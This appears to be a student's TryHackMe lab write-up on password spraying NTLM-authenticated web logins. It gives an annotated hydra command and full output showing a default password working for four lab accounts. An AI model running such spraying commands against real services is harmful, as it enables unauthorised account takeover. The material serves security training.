`NTLM` authentication mechanism is heavily used by the services on a `internal network`. However, services that use NetNTLM `can also be exposed to the internet` For Example:

- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.

- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.

- Exposed VPN endpoints that were integrated with AD.

- Web applications that are internet-facing and make use of NetNTLM.


As mentioned above, these exposed services provide enough attack surface for brute force attack.

Since most AD environments have account lockout configured, we won't be able to run a full brute-force attack. Instead, we need to perform a password spraying attack. 

Instead of trying multiple different passwords, which may trigger the account lockout mechanism, we choose and use one password and attempt to authenticate with all the usernames we have acquired


# `Password Spary is a kind of Brute Force attack`, Traditional brute-force attacks target a single account with multiple possible passwords. A password spraying campaign targets multiple accounts with one password at a time.

*************************************************************************************************************************

Consider during `OSINT` we found a number of users, and during OSINT we also found that default password for a newly onboarded user is "Changeme123". 

We will brute force this using `hydra` and custom python script


- Using `Hydra`

# -I = do not read a restore file if present
# -V = very verbose output
# -L = list of usernames
# -p = single password
# ntlmauth.za.tryhackme.com = target
# http-get = hydra module
# '/:A=NTLM:F=401'
    # / = path to the login page
    # A=NTLM = NTLM authentication type
    # F=401 = failure code
    
hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'

┌──(kali㉿kali)-[~/Downloads/passspray]
└─$ `hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'`

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-28 09:25:35
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:20/p:1), ~2 tries per task
[DATA] attacking http-get://ntlmauth.za.tryhackme.com:80/:A=NTLM:F=401
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "anthony.reynolds" - pass "Changeme123" - 1 of 20 [child 0] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "samantha.thompson" - pass "Changeme123" - 2 of 20 [child 1] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "dawn.turner" - pass "Changeme123" - 3 of 20 [child 2] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "frances.chapman" - pass "Changeme123" - 4 of 20 [child 3] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "henry.taylor" - pass "Changeme123" - 5 of 20 [child 4] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "jennifer.wood" - pass "Changeme123" - 6 of 20 [child 5] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "hollie.powell" - pass "Changeme123" - 7 of 20 [child 6] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "louise.talbot" - pass "Changeme123" - 8 of 20 [child 7] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "heather.smith" - pass "Changeme123" - 9 of 20 [child 8] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "dominic.elliott" - pass "Changeme123" - 10 of 20 [child 9] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "gordon.stevens" - pass "Changeme123" - 11 of 20 [child 10] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "alan.jones" - pass "Changeme123" - 12 of 20 [child 11] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "frank.fletcher" - pass "Changeme123" - 13 of 20 [child 12] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "maria.sheppard" - pass "Changeme123" - 14 of 20 [child 13] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "sophie.blackburn" - pass "Changeme123" - 15 of 20 [child 14] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "dawn.hughes" - pass "Changeme123" - 16 of 20 [child 15] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "henry.black" - pass "Changeme123" - 17 of 20 [child 0] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "joanne.davies" - pass "Changeme123" - 18 of 20 [child 4] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "mark.oconnor" - pass "Changeme123" - 19 of 20 [child 13] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "georgina.edwards" - pass "Changeme123" - 20 of 20 [child 14] (0/0)
[80][http-get] host: ntlmauth.za.tryhackme.com   login: hollie.powell   password: Changeme123
[80][http-get] host: ntlmauth.za.tryhackme.com   login: gordon.stevens   password: Changeme123
[80][http-get] host: ntlmauth.za.tryhackme.com   login: heather.smith   password: Changeme123
[80][http-get] host: ntlmauth.za.tryhackme.com   login: georgina.edwards   password: Changeme123
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-28 09:25:37
                                                                                                                                                                                                                                           



1798	463.790278822	10.200.55.201	10.50.53.49	HTTP	879	HTTP/1.1 401 Unauthorized , NTLMSSP_CHALLENGE (text/html)